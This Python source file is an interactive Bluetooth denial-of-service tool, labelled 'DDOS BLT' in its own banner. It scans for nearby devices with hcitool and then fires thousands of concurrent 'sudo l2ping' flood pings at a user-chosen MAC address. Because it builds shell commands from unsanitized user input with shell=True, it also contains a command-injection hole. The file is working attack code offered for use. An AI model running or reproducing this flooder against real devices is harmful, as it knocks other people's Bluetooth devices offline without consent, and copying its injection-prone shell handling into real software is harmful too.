import subprocess
import time

from ui import logo, Bcolors


class Interface:
    def __init__(self, mac_order=None, bytes_=600):
        if mac_order is None:
            mac_order = []
        elif mac_order is not list:
            mac_order = [mac_order]

        if bytes_ is not None:
            if bytes_ > 600:
                bytes_ = 600

        self.mac_order = mac_order
        self.bytes = bytes_

        self.__start()

    @staticmethod
    def find_all():
        scan_com = 'hcitool scan'
        subprocess.Popen(scan_com, shell=True)

    def run(self):
        xterm_1 = f'sudo l2ping -i hci0 -s {self.bytes} -f {self.mac_order}'

        for i in range(1, 10000):
            subprocess.Popen(xterm_1, shell=True)
            time.sleep(0.1)
            print(f'Progress - {i}')

    def set_bytes(self, bytes_):
        self.bytes = bytes_

    def set_mac_order(self, mac_order):
        self.mac_order = mac_order

    def show_setting(self):
        print(f'MAC-order: {self.mac_order}\nBytes: {self.bytes}\n')

    def __start(self):
        logo()
        active = None
        print(Bcolors.OKGREEN + 'Command for DDOS BLT:')
        print('set-mac <mac_order>\nset-bytes <count bytes>\nshow\nfind\nrun')
        print('=' * 40, end='\n\n')
        while active != 'stop':
            active = input()
            if 'set-mac ' in active:
                self.set_mac_order(active[8:])
                print(active[8:])
            elif 'set-bytes ' in active:
                self.set_bytes(active[10:])
                print(active[10:])
            elif 'find' in active:
                self.find_all()
            elif 'show' in active:
                self.show_setting()
            elif 'run' in active:
                self.run()


inter = Interface()
